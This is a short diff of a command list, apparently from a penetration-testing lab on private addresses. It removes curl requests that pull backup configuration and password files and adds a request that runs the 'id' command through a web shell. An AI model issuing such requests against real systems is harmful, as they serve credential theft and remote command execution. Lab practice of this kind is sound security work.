@@ -1,3 +1,3 @@
-curl http://172.17.17.104:8080/passwords/heroes.xml
-curl http://172.17.17.104:8080/passwords/web.config.bak
-curl http://172.17.17.104:8080/passwords/wp-config.bak
+curl "http://172.17.17.118:8080/shell/?cmd=id"
+
+curl http://172.17.17.118:8080/examples/
